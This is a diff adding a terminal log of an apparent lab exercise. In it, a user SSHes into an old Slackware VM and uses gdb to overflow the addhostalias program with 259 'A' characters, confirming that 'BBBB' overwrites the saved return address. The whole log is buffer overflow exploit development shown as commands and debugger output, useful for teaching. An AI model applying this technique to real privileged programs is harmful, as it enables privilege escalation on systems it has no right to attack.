@@ -1,0 +1,86 @@
+PS C:\Users\David>   ssh -c aes256-cbc -oKexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oMACs=hmac-sha1 -p 2222 dvader@localhost
+dvader@localhost's password:
+Last login: Mon Apr 20 11:27:47 2026 from 10.0.2.2
+Linux 2.4.18.
+dvader@deathstar:~$   echo $SHLVL
+1
+dvader@deathstar:~$   gdb /usr/bin/addhostalias
+GNU gdb 5.2
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) info registers
+The program has no registers now.
+(gdb)   break *0x8048569
+Breakpoint 1 at 0x8048569
+(gdb)   run $(python -c "print 'A'*259") BBBB a
+Starting program: /usr/bin/addhostalias $(python -c "print 'A'*259") BBBB a
+
+Breakpoint 1, 0x08048569 in add_alias ()
+(gdb) info registers
+eax            0x10b    267
+ecx            0x1      1
+edx            0x80486e9        134514409
+ebx            0x40134e58       1075007064
+esp            0xbffffa44       0xbffffa44
+ebp            0xbffffb7c       0xbffffb7c
+esi            0x4001488c       1073825932
+edi            0xbffffc04       -1073742844
+eip            0x8048569        0x8048569
+eflags         0x287    647
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+fctrl          0x37f    895
+fstat          0x0      0
+ftag           0xffff   65535
+fiseg          0x0      0
+fioff          0x4008e31c       1074324252
+foseg          0x0      0
+fooff          0x0      0
+fop            0x0      0
+xmm0           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm1           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm2           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm3           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm4           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm5           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm6           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+xmm7           {f = {0x0, 0x0, 0x0, 0x0}}       {f = {0, 0, 0, 0}}
+mxcsr          0x1f80   8064
+orig_eax       0xffffffff       -1
+(gdb)   x/4x $ebp+4
+0xbffffb80:     0x42424242      0x000a6109      0xbffffe18      0xbffffe1d
+(gdb)   x/100x $ebp-256
+0xbffffa7c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffa8c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffa9c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffaac:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffabc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffacc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffadc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffaec:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffafc:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb0c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb1c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb2c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb3c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb4c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb5c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb6c:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffb7c:     0x09414141      0x42424242      0x000a6109      0xbffffe18
+0xbffffb8c:     0xbffffe1d      0x40134e58      0x40009e40      0xbffffbb8
+0xbffffb9c:     0xbffffbd8      0x4003017d      0x00000004      0xbffffc04
+0xbffffbac:     0xbffffc18      0x080486a0      0x00000000      0xbffffbd8
+0xbffffbbc:     0x4003014d      0x400143ac      0x00000004      0x08048460
+0xbffffbcc:     0xbffffc04      0x400300c0      0x40132cc0      0x00000000
+0xbffffbdc:     0x08048481      0x08048604      0x00000004      0xbffffc04
+0xbffffbec:     0x08048388      0x080486a0      0x4000a534      0xbffffbfc
+0xbffffbfc:     0x400148ec      0x00000004      0xbffffcfe      0xbffffd14
+(gdb)
